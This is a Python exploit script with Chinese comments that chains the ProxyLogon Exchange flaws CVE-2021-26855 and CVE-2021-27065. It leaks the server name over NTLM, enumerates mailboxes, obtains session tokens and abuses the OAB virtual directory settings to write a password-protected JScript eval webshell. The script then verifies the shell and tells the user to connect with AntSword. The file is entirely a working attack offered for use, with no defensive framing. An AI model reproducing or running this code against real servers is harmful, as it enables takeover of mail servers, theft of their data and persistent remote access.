# coding:utf-8
import requests
import urllib3
from struct import unpack
import re
import tld
import base64
import json
from urllib import parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class EXP:
    def __init__(self):
        self.banner=f"\033[32m{'-'*50}\n[*] 请输入https://xxx.com/这样的url，注意最后的斜杠\n[*] 如果你拿到的是一个ip形式的url，请找出域名并替换\n[*] 公众号：台下言书     author：说书人\n{'-'*50}\033[0m"
        self.ua = 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65'
        self.webshell = '<script language="JScript" runat="server">function Page_Load(){eval(Request["babanb"],"unsafe");}</script>'
        self.success_info = "\033[32m[+] 请用蚁剑连接, 密码：babanb\033[0m"

    def parse_challenge(self, Negotiate_base64_decode):
        target_info_field = Negotiate_base64_decode[40:48]
        target_info_len = unpack('H', target_info_field[0:2])[0]
        target_info_offset = unpack('I', target_info_field[4:8])[0]
        target_info_bytes = Negotiate_base64_decode[target_info_offset:target_info_offset + target_info_len]
        domain_name = ''
        computer_name = ''
        info_offset = 0
        while info_offset < len(target_info_bytes):
            av_id = unpack('H', target_info_bytes[info_offset:info_offset + 2])[0]
            av_len = unpack('H', target_info_bytes[info_offset + 2:info_offset + 4])[0]
            av_value = target_info_bytes[info_offset + 4:info_offset + 4 + av_len]
            info_offset = info_offset + 4 + av_len
            if av_id == 2:  # MsvAvDnsDomainName
                domain_name = av_value.decode('UTF-8').replace('\x00', '')
            elif av_id == 3:  # MsvAvDnsComputerName
                computer_name = av_value.decode('UTF-8').replace('\x00', '')
        if domain_name and computer_name:
            return domain_name, computer_name
        else:
            return None

    def CVE_2021_26855_SSRF(self, url):
        ntlm_type1 = (
            b'NTLMSSP\x00'  # NTLMSSp签名
            b'\x01\x00\x00\x00'  # 信息类型
            b'\x97\x82\x08\xe2'  # 标记
            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # 域名称字符
            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # 工作字符
            b'\x0a\x00\xba\x47\x00\x00\x00\x0f'  # 系统版本
        )
        headers = {"User-Agent": self.ua, 'Authorization': 'Negotiate {}'.format(base64.b64encode(ntlm_type1).decode("utf-8"))}
        vul_url = url + 'rpc/'
        try:
            res = requests.get(url=vul_url, verify=False, headers=headers, timeout=30)
            Negotiate_base64_encode = res.headers['WWW-Authenticate']
            Negotiate_base64_decode = re.search('Negotiate ([A-Za-z0-9/+=]+)', Negotiate_base64_encode).group(1)
            domain_name, computer_name = self.parse_challenge(base64.b64decode(Negotiate_base64_decode))
            print(f"\033[32m[o] 计算机名称: {computer_name}\033[0m")
            print(f"\033[32m[o] 域名称:    {domain_name}\033[0m")
        except:
            computer_name = None
            print(f"\033[32m[-] GG～\033[0m")

        return computer_name

    def CVE_2021_27065_RCE(self, url, computer_name):
        mail_user_list = ['administrator', 'root', 'info', 'webmaster', 'contacto', 'no-reply', 'noreply', 'support', 'admin', 'prueba', 'test']
        vul_url = url + f'ecp/baba.js'
        for mail_user in mail_user_list:

            try:
                try:
                    # 非域名形式的直接pass掉
                    root_domain = tld.get_fld(url)
                except:
                    print("\033[32m[o]请使用域名url的方式访问，而不是ip url\033[0m")
                    return None
                email = f'{mail_user}@{root_domain}'
                print(f"\033[32m[o] 尝试邮箱: {email}\033[0m")
                # 获取LegacyDN
                postdata = f'''
                <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
                    <Request>
                         <EMailAddress>{email}</EMailAddress>
                        <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
                    </Request>
                </Autodiscover>
                    '''
                headers = {
                    'User-Agent': 'ExchangeServicesClient/0.0.0.0',
                    'Content-Type': 'text/xml',
                    'Cookie': f'X-BEResource=a]@{computer_name}:444/autodiscover/autodiscover.xml?#~1941962753',
                    'msExchLogonMailbox': 'S-1-5-20'
                }

                res1 = requests.post(vul_url, headers=headers, data=postdata, verify=False, allow_redirects=False, timeout=30)
                LegacyDN = re.findall(r'<LegacyDN>(.*?)</LegacyDN>', res1.text)[0]
                print(f"\033[32m[o] LegacyDN: {LegacyDN}\033[0m")

                # 获取SID
                headers = {
                    'X-Clientapplication': 'Outlook/15.0.4815.1002',
                    'X-Requestid': 'x',
                    'X-Requesttype': 'Connect',
                    'Cookie': f'X-BEResource=a]@{computer_name}:444/mapi/emsmdb/?#~1941962753',
                    'Content-Type': 'application/mapi-http',
                    'msExchLogonMailbox': 'S-1-5-20',
                }
                postdata = LegacyDN + '\x00\x00\x00\x00\x00\x20\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00'

                res2 = requests.post(vul_url, headers=headers, data=postdata, verify=False, allow_redirects=False, timeout=30)
                SID = re.search(b'with SID ([S\-0-9]+) ', res2.content).group(1).decode('utf-8')
                print(f"\033[32m[o] SID: {SID}\033[0m")

                # 获取Session_id和Canary
                postdata = '<r at="NTLM" ln="{}"><s t="0">{}</s></r>'.format(email.split('@')[0], SID)
                headers = {
                    'X-Clientapplication': 'Outlook/15.0.4815.1002',
                    'X-Requestid': 'x',
                    'X-Requesttype': 'Connect',
                    'Cookie': f'X-BEResource=a]@{computer_name}:444/ecp/proxyLogon.ecp?#~1941962753',
                    'Content-Type': 'application/json',
                    'msExchLogonMailbox': 'S-1-5-20',
                }

                res3 = requests.post(vul_url, headers=headers, data=postdata, verify=False, allow_redirects=False, timeout=30)
                session_id = res3.cookies.get('ASP.NET_SessionId')
                canary = res3.cookies.get('msExchEcpCanary')
                print(f"\033[32m[o] Session_id: {session_id}\033[0m")
                print(f"\033[32m[o] Canary: {canary}\033[0m")

                # 获取OAB信息
                qs = parse.urlencode({'schema': 'OABVirtualDirectory', 'msExchEcpCanary': canary})
                headers = {
                    'X-Clientapplication': 'Outlook/15.0.4815.1002',
                    'X-Requestid': 'x',
                    'X-Requesttype': 'Connect',
                    'Cookie': f'X-BEResource=a]@{computer_name}:444/ecp/DDI/DDIService.svc/GetObject?{qs}#~1941962753;ASP.NET_SessionId={session_id};msExchEcpCanary={canary}',
                    'Content-Type': 'application/json',
                    'msExchLogonMailbox': 'S-1-5-20',
                }

                res4 = requests.post(vul_url, headers=headers, data='', verify=False, allow_redirects=False, timeout=30)
                identity = res4.json()['d']['Output'][0]['Identity']
                print(f"\033[32m[o] OAB Name: {identity['DisplayName']}\033[0m")
                print(f"\033[32m[o] OAB ID: {identity['RawIdentity']}\033[0m")

                # 通过OAB设置Webshell
                file_path = 'C:\\inetpub\\wwwroot\\aspnet_client\\.baba_die.aspx'
                file_data = self.webshell
                qs = parse.urlencode({'schema': 'OABVirtualDirectory', 'msExchEcpCanary': canary})
                postdata = json.dumps({'identity': {'__type': 'Identity:ECP', 'DisplayName': identity['DisplayName'], 'RawIdentity': identity['RawIdentity']}, 'properties': {'Parameters': {'__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel', 'ExternalUrl': 'http://f/' + file_data}}})
                headers = {
                    'X-Clientapplication': 'Outlook/15.0.4815.1002',
                    'X-Requestid': 'x',
                    'X-Requesttype': 'Connect',
                    'Cookie': f'X-BEResource=a]@{computer_name}:444/ecp/DDI/DDIService.svc/SetObject?{qs}#~1941962753;ASP.NET_SessionId={session_id};msExchEcpCanary={canary}',
                    'Content-Type': 'application/json',
                    'msExchLogonMailbox': 'S-1-5-20',
                }

                res5 = requests.post(vul_url, headers=headers, data=postdata, verify=False, timeout=30)
                if res5.status_code == 200:
                    print("\033[32m[o] 通过OAB设置Webshell成功\033[0m")
                    # 写入Webshell
                    qs = parse.urlencode({
                        'schema': 'ResetOABVirtualDirectory',
                        'msExchEcpCanary': canary
                    })
                    postdata = json.dumps({
                        'identity': {
                            '__type': 'Identity:ECP',
                            'DisplayName': identity['DisplayName'],
                            'RawIdentity': identity['RawIdentity']
                        },
                        'properties': {
                            'Parameters': {
                                '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
                                'FilePathName': file_path
                            }
                        }
                    })
                    headers = {
                        'X-Clientapplication': 'Outlook/15.0.4815.1002',
                        'X-Requestid': 'x',
                        'X-Requesttype': 'Connect',
                        'Cookie': f'X-BEResource=a]@{computer_name}:444/ecp/DDI/DDIService.svc/SetObject?{qs}#~1941962753;ASP.NET_SessionId={session_id};msExchEcpCanary={canary}',
                        'Content-Type': 'application/json',
                        'msExchLogonMailbox': 'S-1-5-20',
                    }

                    res6 = requests.post(vul_url, headers=headers, data=postdata, verify=False, allow_redirects=False, timeout=30)
                    if res6.status_code == 200:
                        print("\033[32m[o] 正在尝试写入Webshell\033[0m")
                        # 清除 OAB
                        qs = parse.urlencode({
                            'schema': 'OABVirtualDirectory',
                            'msExchEcpCanary': canary
                        })
                        postdata = json.dumps({
                            'identity': {
                                '__type': 'Identity:ECP',
                                'DisplayName': identity['DisplayName'],
                                'RawIdentity': identity['RawIdentity']
                            },
                            'properties': {
                                'Parameters': {
                                    '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
                                    'ExternalUrl': ''
                                }
                            }
                        })
                        headers = {
                            'X-Clientapplication': 'Outlook/15.0.4815.1002',
                            'X-Requestid': 'x',
                            'X-Requesttype': 'Connect',
                            'Cookie': f'X-BEResource=a]@{computer_name}:444/ecp/DDI/DDIService.svc/SetObject?{qs}#~1941962753;ASP.NET_SessionId={session_id};msExchEcpCanary={canary}',
                            'Content-Type': 'application/json',
                            'msExchLogonMailbox': 'S-1-5-20',
                        }

                        res7 = requests.post(vul_url, headers=headers, data=postdata, verify=False, allow_redirects=False, timeout=30)
                        print("\033[32m[o] 清除 OAB，验证webshell\033[0m")
                        # 验证webshell
                        webshell_url = f"{url}/aspnet_client/.baba_die.aspx"
                        res8 = requests.get(url=webshell_url, verify=False, allow_redirects=False, timeout=30)
                        if res8.status_code == 200 and 'Name' in res8.text and 'PollInterval' in res8.text and 'OfflineAddressBooks' in res8.text:
                            print(f"\033[32m[+] Webshll:{webshell_url}\033[0m")
                            print(self.success_info)
                            return None
                        else:
                            print(f"\033[32m[-] GG～\033[0m")
                    else:
                        print(f"\033[32m[-] GG～\033[0m")
                else:
                    print(f"\033[32m[-] GG～\033[0m")
            except:
                print(f"\033[32m[-] GG～\033[0m")

        return None

    def run(self, url):
        print(self.banner)
        computer_name = self.CVE_2021_26855_SSRF(url)
        if computer_name is not None:
            self.CVE_2021_27065_RCE(url, computer_name)


if __name__ == '__main__':
    exp = EXP()
    exp.run("https://xxx/")
